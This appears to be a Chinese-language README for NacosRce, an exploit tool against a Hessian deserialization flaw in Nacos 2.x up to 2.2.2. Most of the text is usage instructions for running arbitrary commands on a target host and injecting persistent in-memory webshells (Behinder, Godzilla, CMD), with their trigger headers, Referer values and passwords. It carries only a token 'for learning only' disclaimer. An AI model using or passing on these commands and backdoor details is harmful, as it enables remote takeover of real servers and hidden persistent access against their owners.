## Nacos Hessian 反序列化漏洞利用工具 v0.4

```ini

  _   _                     ____          
 | \ | | __ _  ___ ___  ___|  _ \ ___ ___ 
 |  \| |/ _` |/ __/ _ \/ __| |_) / __/ _ \
 | |\  | (_| | (_| (_) \__ \  _ < (_|  __/
 |_| \_|\__,_|\___\___/|___/_| \_\___\___|
```
Author: 刨洞安全 && 凉风

**注意：工具仅供学习使用，请勿滥用，否则后果自负！**



**食用方式**

> 1. 执行无回显命令（不推荐，因为每次重启nacos都会自动执行一次）
>    `java -jar NacosRce.jar ip:port "command"`
>
> 2. 同时注入冰蝎&哥斯拉&CMD内存马（推荐，重启后自动注入内存马）
>    `java -jar NacosRce.jar ip:port memshell`
>
> 3. 如果nacos是windows的：
>    `java -jar NacosRce.jar ip:port memshell windows`

## 内存马说明

### 冰蝎内存马

> - 需要设置请求头x-client-data:rebeyond
>
> - 设置Referer:https://www.google.com/
>
> - 路径随意
>
> - 密码rebeyond
>

![img.png](img.png)

### 哥斯拉内存马

> - 需要设置请求头x-client-data:godzilla
> - 设置Referer:https://www.google.com/
> - 路径随意
> - 密码是pass 和 key
>

![img_1.png](img_1.png)

### CMD内存马

> - 需要设置请求头x-client-data:cmd
> - 设置Referer:https://www.google.com/
> - 请求头cmd:要执行的命令

![img_2.png](img_2.png)

## 更新日志

v0.4 版本实现了

> 1. 不出网漏洞利用
> 2. 可多次发起漏洞利用
> 3. 注入冰蝎/CMD内存马
> 4. 内存马对多版本进行了兼容
> 5. 修复windows的bug

**tips:**

> - 请用jdk1.8
> - 适用于 Nacos 2.x <= 2.2.2
> - 非集群的也能打哦
> - 此内存马重启nacos依然存活

项目地址：https://github.com/c0olw/NacosRce

## 参考文章

- [半自动化挖掘 request 实现多种中间件回显 - c0ny1](https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/)
- [Nacos JRaft Hessian 反序列化分析 - p1g3](https://exp.ci/2023/06/14/Nacos-JRaft-Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/)
- [Y4er/ysoserial](https://github.com/Y4er/ysoserial)

